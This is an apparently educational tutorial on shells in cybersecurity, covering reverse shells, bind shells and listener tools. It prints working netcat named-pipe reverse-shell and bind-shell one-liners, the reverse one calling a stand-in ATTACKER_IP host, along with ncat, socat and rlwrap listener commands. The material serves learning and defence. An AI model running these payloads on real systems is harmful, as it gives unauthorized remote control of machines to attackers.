# Shell
## What is a Shell? 

A shell is software that helps users interact with an operating system (OS). It can be a graphical interface but is often a command-line interface, depending on the OS. 

In cybersecurity, a shell typically refers to a session an attacker uses to access a compromised system, letting them run commands and execute programs. This access allows attackers to perform several actions. 

## Key Points: 

• Remote System Control: Attackers can execute commands or software on the target system from a distance. 

• Privilege Escalation: Attackers may try to gain higher access, such as administrative privileges if initial access is limited. 

• Data Exfiltration: They can read and copy sensitive data once they have command access.

• Persistence and Maintenance Access: Attackers can establish continued access through user accounts or backdoor software.

• Post-Exploitation Activities: After gaining shell access, they can deploy malware, create hidden accounts, or delete files. 

• Access Other Systems on the Network: The obtained shell may serve as an entry point for further attacks within the network, a practice known as pivoting. 

The shells discussed later can help achieve various attack objectives.

# Reverse Shell 

A reverse shell, known as a "connect back shell," is a common technique used in cyberattacks to gain access to a system. It connects from the target system to the attacker's machine, which helps evade detection by security devices like firewalls. 

## How Reverse Shells Work 

• Set up a Netcat Listener: To understand how a reverse shell operates, we use the Netcat tool, which works on various operating systems and allows reading and writing over a network. The attacker sets up a listener using the command `nc -lvnp 443`. 

• These command options include `-l` for listening, `-v` for verbose mode, `-n` to prevent DNS lookups, and `-p`, which specifies the port to wait for connectionshere, port 443. Attackers often use commonly known ports (53, 80, 8080, 443, 139, or 445) to blend in with regular traffic and not get detected. 

• Gaining Reverse Shell Access: After setting up a listener, the attacker executes a reverse shell payload. This payload usually exploits a vulnerability or unauthorized access to create a shell that communicates over the network. Different payloads depend on the tools and operating systems used, one example being the pipe reverse shell: 

``` 
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc ATTACKER_IP ATTACKER_PORT &gt;/tmp/f 
``` 

• Explanation of the Payload: 

• `rm -f /tmp/f`: Deletes any existing named pipe file at /tmp/f to create a new one without issues. 

• `mkfifo /tmp/f`: Creates a named pipe, enabling two-way communication. 

• `cat /tmp/f`: Reads input from the named pipe.

• `| bash -i 2&gt;&amp;1`: Connects input to an interactive shell, sending error messages back. 

• `| nc ATTACKER_IP ATTACKER_PORT &gt;/tmp/f`: Sends the shell output to the attacker's machine. 

• Attacker Receives the Shell: After the payload runs, the attacker receives a reverse shell and can execute commands as if they were logged into a normal terminal. 

### Example output from the attacker receiving the shell: 

``` 
Listening on [any] 443 . . . 
connect to [10. 4. 99. 209] from (UNKNOWN) [10. 10. 13. 37] 59964 
``` 

This connection shows the target's IP address, indicating successful access.

# Bind Shell 

A bind shell is a method used by attackers to remotely execute commands on a compromised system by binding a port and listening for incoming connections. This approach is useful when the target does not permit outgoing connections, but it is less common due to the risk of detection when the shell stays active and listens. 

## How Bind Shells Work 

Setting Up the Bind Shell on the Target 
To create a bind shell, an attacker runs the following command on the target machine: 

``` 
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2&gt;&amp;1 | nc -l 0. 0. 0. 0 8080 &gt; /tmp/f 
``` 

## Explanation of the Payload: 

• `rm -f /tmp/f`: Removes any existing named pipe at `/tmp/f` to avoid conflicts. 

• `mkfifo /tmp/f`: Creates a new named pipe at `/tmp/f` for two-way communication. 

• `cat /tmp/f`: Reads data from the named pipe, waiting for input. 

• `| bash -i 2&gt;&amp;1`: Sends the output from the named pipe to an interactive shell, 
allowing command execution and error messages to be sent back. 

• `| nc -l 0. 0. 0. 0 8080`: Starts Netcat in listening mode at port 8080 on all interfaces, exposing the shell to any incoming connections. 

• `&gt;/tmp/f`: Redirects the output back into the named pipe for two-way communication. 

Ports below 1024 require elevated privileges for execution, thus port 8080 is chosen to avoid this. 

## Attacker Connects to the Bind Shell 

After the bind shell is set up, the attacker connects using the command: 

``` 
nc -nv TARGET_IP 8080 
``` 

## Explanation of the command: 

• `nc`: Calls Netcat to establish the connection. 

• `-n`: Disables DNS resolution for faster performance. 

• `-v`: Enables verbose mode for detailed output. 

• `TARGET_IP`: The target's IP address where the bind shell is set up. 

• `8080`: The listening port of the bind shell. 

The attacker will see an open connection once connected, allowing them to execute commands on the target machine.

# Tools for Listening to Reverse Shells 

## Introduction: 
This content discusses different utilities that can be used as listeners for connecting with reverse shells from compromised targets to an attacker's machine. 

## Key Points: 

1. Reverse Shell Overview: 
A reverse shell connects a compromised target back to the attacker's machine. While Netcat is commonly used, other utilities can also facilitate this. 

2. Rlwrap: 
• A small utility that enhances Netcat by providing keyboard editing and command history features. 

• Usage Example: 
``` 
attacker@kali:~$ rlwrap nc -lvnp 443 
``` 

3. Ncat: 

• An enhanced version of Netcat from the NMAP project, offering additional features such as SSL encryption. 

• Listening without SSL: 
``` 
attacker@kali:~$ ncat -lvnp 4444 
``` 
• Listening with SSL: 
``` 
attacker@kali:~$ ncat --ssl -lvnp 4444 
``` 

4. Socat: 
• A utility that creates socket connections between different hosts. 

• Default Usage Example: 
``` 
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT 
``` 

## Conclusion: 
These tools provide various functionalities to listen for incoming reverse shells, enhancing the attacker's ability to manage interactions with compromised systems.